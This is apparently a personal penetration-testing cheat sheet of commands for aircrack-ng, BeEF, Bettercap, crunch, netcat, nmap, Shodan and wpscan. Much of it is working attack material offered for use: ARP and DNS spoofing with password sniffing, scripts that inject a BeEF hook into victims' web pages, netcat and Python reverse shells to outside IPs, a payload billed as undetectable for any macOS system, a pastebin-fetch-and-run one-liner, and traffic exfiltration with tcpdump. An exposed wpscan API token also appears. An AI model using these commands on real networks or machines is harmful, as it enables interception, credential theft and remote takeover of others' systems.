To crack WEP for a given essid name and store into a file

    aircrack-ng -a 1 -e <essid> -l <output file> <.cap or .ivs file(s)>

To crack WPA/WPA2 from airolib-ng database

    aircrack-ng -e <essid> -r <database> <.cap or .ivs file(s)>

To crack WPA/WPA2 from a wordlist

    aircrack-ng -e <essid> -w <wordlist> <.cap or .ivs file(s)>

To crack a given bssid

    aircrack-ng -b <bssid> -l <output file> <.cap or .ivs file(s)>

To crack a given bssid using FMS/Korek method

    aircrack-ng -K -b <bssid> <.cap or .ivs file(s)>

To crack a given essid (WEP) and display the ASCII of the key

    aircrack-ng -e <essid> -s <.cap of .ivs file(s)>

To crack a given essid (WEP) and create a EWSA Project

    aircrack-ng -e <essid> -E <EWSA file> <.cap or .ivs file(s)>

## Beef

### Mac installation

On your git folder:

Clone the repository on and enter in the beef folder:

	git clone https://github.com/beefproject/beef
	cd beef

Then install all gem needed:

https://github.com/beefproject/beef/blob/master/Gemfile

	gem install bundler (install bundler installer)
	verify if the "Gemfile" exist in the folder
	bundle install (install all gem from Gemfile)
	./install

Run Beef:

	./beef

```
git pull (update repository)
```

## Bettercap

### GUI

Install GUI:

```bash
sudo bettercap -eval "caplets.update; ui.update; q"
```

Execute:

```bash
sudo bettercap -caplet http-ui 192.168.0.1 -iface en0
```

### Mac OS

Open bettercap: (configure the gateway and the interface for Mac OS)

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0
```

### Scan networks

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'net.recon on;net.probe on;clear;ticker on;'
```

### Active sniffing (interactive)

```bash
set net.sniff.regexp %Variable%RegEx%;

set net.sniff.regexp .*password=.+;

set net.sniff.output passwords.pcap;
net.sniff on;
```

### ARP spoofing

Spoof all the hosts: (be careful on big network)

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;arp.spoof on;'
```

Spoof a specific host:

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;'
```

### DNS Spoofing

Spoof all the hosts: (be careful on big network)

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;arp.spoof on;set dns.spoof.domains apache.com;set dns.spoof.all true;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'
```

Spoof a specific host:

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;set dns.spoof.domains apache.com;set dns.spoof.address 192.168.0.116;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'
```

### Script injection

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;set http.proxy.script /Library/WebServer/Documents/bettercap/beef.js;set http.proxy.blacklist *;set http.proxy.whitelist apache.com;http.proxy on'
```

#### beef.js

```javascript
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://192.168.0.110:3000/hook.js"></script></head>' 
            );
        }
    }
}
```

#### invert.js

```javascript
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        if (body.indexOf('</head>') != -1) {
            res.Body = body.replace(
                '</head>',
                '<style>body {transform: scaleX(-1);}</style></head>'
            );
        }
    }
}
```

#### redirect.js

```javascript
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        if (body.indexOf('</head>') != -1) {
            res.Body = body.replace(
                '</head>',
                '<script>window.location.href="http://www.w3schools.com";</script></head>'
            );
        }
    }
}
```

#### replace.js

```javascript
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                'ano', 
                'anus' 
            );
        }
    }
}
```

#### web-override.js

```javascript
// Called before every request is executed, just override the response with 
// our own html web page.
function onRequest(req, res) {
    headers = res.Headers.split("\r\n");
    for (var i = 0; i < headers.length; i++) {
        header_name = headers[i].replace(/:.*/, "");
        res.RemoveHeader(header_name);
    }
    res.SetHeader("Connection", "close");
    res.Status = 200;
    res.ContentType = "text/html";
    res.Body = readFile("/Library/WebServer/Documents/index.html"); // local html document
}
```

## Crunch

Main command:

```bash
crunch <min> <max> <character-set> -t <pattern> -o <path>
```

crunch – crunch is the keyword which notifies the system to use this tool.
<min> – here you specify the minimum length characters you want.
<max> – here you specify the maximum length of characters.
<character-set> – here you specify the characters you want it to use while creating the dictionary.
-t <pattern>- this is optional but here you can specify the pattern in with you want your character-set to be.
-o <path> – here you give the path where you want your dictionary file to be saved.

Example:

	• crunch 2 4 -f /usr/local/Cellar/crunch/3.6/share/charset.lst mixalpha-numeric -o nicotest.txt
	
	• crunch 8 8 -f /usr/share/crunch/charset.lst hex-lower -d 2@ (not 3 same characters one after other)

Charsets:

hex-lower = [0123456789abcdef]
hex-upper = [0123456789ABCDEF]

numeric = [0123456789]
numeric-space = [0123456789 ]

symbols14 = [!@#$%^&*()-_+=]
symbols14-space = [!@#$%^&*()-_+= ]

symbols-all = [!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
symbols-all-space = [!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]

ualpha = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]
ualpha-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ ]
ualpha-numeric = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]
ualpha-numeric-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]
ualpha-numeric-symbol14 = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=]
ualpha-numeric-symbol14-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+= ]
ualpha-numeric-all = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
ualpha-numeric-all-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]

lalpha = [abcdefghijklmnopqrstuvwxyz]
lalpha-space = [abcdefghijklmnopqrstuvwxyz ]
lalpha-numeric = [abcdefghijklmnopqrstuvwxyz0123456789]
lalpha-numeric-space = [abcdefghijklmnopqrstuvwxyz0123456789 ]
lalpha-numeric-symbol14 = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=]
lalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+= ]
lalpha-numeric-all = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
lalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]

mixalpha = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]
mixalpha-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ]
mixalpha-numeric = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]
mixalpha-numeric-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]
mixalpha-numeric-symbol14 = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=]
mixalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+= ]
mixalpha-numeric-all = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
mixalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]

#########################

### Uppercase ###

ualpha-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]
ualpha-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]
ualpha-numeric-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]
ualpha-numeric-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]
ualpha-numeric-symbol14-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=]
ualpha-numeric-symbol14-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+= ]
ualpha-numeric-all-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
ualpha-numeric-all-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]

### Lowercase ###

lalpha-sv = [abcdefghijklmnopqrstuvwxyzåäö]
lalpha-space-sv = [abcdefghijklmnopqrstuvwxyzåäö ]
lalpha-numeric-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789]
lalpha-numeric-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789 ]
lalpha-numeric-symbol14-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=]
lalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+= ]
lalpha-numeric-all-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
lalpha-numeric-all-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]

### Mixcase ###

mixalpha-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]
mixalpha-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]
mixalpha-numeric-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]
mixalpha-numeric-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]
mixalpha-numeric-symbol14-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=]
mixalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+= ]
mixalpha-numeric-all-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
mixalpha-numeric-all-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/

## Netcat

Kali:

	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
	nc  -lvvp 8888 -e /bin/bash (listen)

MacOS:

	nc KALI-IP 8888 (connect - cannot execute -e directly)
	nc -l 8888 (listen - cannot execute -e directly)

Windows:

	nc KALI-IP 8888 -e cmd.exe (connect)
	nc  -lvvp 8888 -e cmd.exe (listen)

### Reverse Shell

Shell:

	mkfifo /tmp/f; nc 192.168.0.110 2222 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Bash:

	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | /bin/bash -i >/tmp/f 2>&1; rm /tmp/f

Bash: (root)

	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | sudo /bin/bash -i >/tmp/f 2>&1; rm /tmp/f

### Netcat & TCPDump

Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic

#### Data in file

	/usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)
	nc -l -p 7777 | tee /tmp/sniffed_output.pcapng (on kali)

#### Data in real time

On kali:

	mkfifo /tmp/wiretap
	nc -l -p 9999 > /tmp/wiretap
	wireshark -k -i /tmp/wiretap

On mac:

	/usr/sbin/tcpdump -i <interface> -w - | nc 1.2.3.4 9999

### Netcat & Payload

#### Option 1

Create an indetectable payload in python and use it to get a shell on every macos system:

	nc -l -p 8080 (listening on kali)

Create a python payload:

	nano payload.py (and paste that script changing the ip)
	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

Then, just have to execute that script on macos computer.

	sudo python payload.py

#### Option 2

An other option is to send the script online with a pastebin web service:

	https://pastebin.com

And execute this command on the macos computer:

	curl https://pastebin.com/raw/P6p9WwAT | python - &

#### Option 3

Create a MacOs application to run the script on background with platypus:

	https://sveinbjorn.org/platypus

### Scanner

Check TCP ports:

    nc -zn RHOST PORTS

Check TCP ports: (verbose)

    nc -znv RHOST PORTS

Check UDP ports:

    nc -znu RHOST PORTS

Check UDP ports: (verbose)

    nc -znvu RHOST PORTS

## Nmap

```bash
nmap 10.0.0.0-15 -v
nmap scanme.nmap.org -v
nmap -sP 192.168.0.0/24 -oN file.txt
nmap 10.0.0.0/24 --exclude 10.0.0.1,10.0.0.2
```

Scan of services:

	nmap 10.0.0.0-15 -sV
	nmap 10.0.0.0-15 -sV --version-light
	nmap 10.0.0.0-15 -sV --version-all

OS detection:

	nmap 10.0.0.0-15 -O -v -p80
	nmap 10.0.0.0-15 -O -v -osscan-limit
	nmap 10.0.0.0-15 -O -v -osscan-guess

OS detection, versions, scripts, traceroute:

	nmap 10.0.0.0-15 -A

Scripts:

	nmap 10.0.0.0 -sC -v
	nmap scanme.nmap.org --script default -v
	nmap scanme.nmap.org --script "http-*" -p80 -v
	nmap scanme.nmap.org --script "not dos" -p80 -v
	nmap --script-updatedb 

Scenario:

	nmap 10.0.0.0 -p21
	nmap 10.0.0.0 -p21 -sV
	Locate "*vsftp*.nse"
	nmap 10.0.0.0 -p21 --script ftp-vsftp-backdoor

## PS

To list every process on the system:

    ps aux

To list a process tree

    ps axjf

To list every process owned by foouser:

    ps -aufoouser

To list every process with a user-defined format:

    ps -eo pid,user,command

List the processes being run by a particular set of usernames

    ps -f -u username1, username2, .... ,usernameN 

Display a list of processes with a particular parent ID (5589)
Note that when a process is launched it may spawn several other sub processes which all share a common parent process ID

    ps -f -ppid 5589

List processes with given PIDs

    ps -f -p 25001, 4567, 789

Display all processes owned by the current user

    ps -U $USER

Sort processes based on CPU and memory usage (useful for finding memory leaks)

    ps aux --sort pmem

## Shodan

Filter IP range

    net:<ip range>

Filter port

    port:<port>

Filter location

    city:"<city>" country:<country_code>
    geo:<coords>

Filter hostname

    hostname:<hostname>

Filter operating system

    os:<operating system>

Filter dates

Acceptable formats are: day/month/year or day-month-year

    before:<date>
    after:<date>

## Wpscan

Update database:

	• wpscan -update

Target URI:

	• wpscan --url targetwordpressurl.com --api-token kIsaNW6wucvs5IJMq5afkDFhh8ZjAXZ6yvN7JgfQglk

Enumerating WordPress Theme:

	• wpscan -u http://targetwordpressurl.com --enumerate t

Enumerating Popular WordPress Plugins:

	• wpscan --url http://targetwordpressurl.com --enumerate p --plugins-detection mixed

Enumerating WordPress Vulnerable Theme:

	• wpscan -u http://targetwordpressurl.com --enumerate vt

Enumerating WordPress Plugins:

	• wpscan —url http://targetwordpressurl.com --enumerate ap

Enumerating WordPress Vulnerable Plugins:

	• wpscan -u http://targetwordpressurl.com --enumerate vp

Enumerating WordPress User:

	• wpscan -u http://targetwordpressurl.com --enumerate u

Enumerate ALL with a single command:

	• wpscan -u http://targetwordpressurl.com -e at -e ap -e u

-e at: enumerate all themes of targeted website
-e ap: enumerate all plugins of targeted website
-e u: enumerate all usernames of targeted website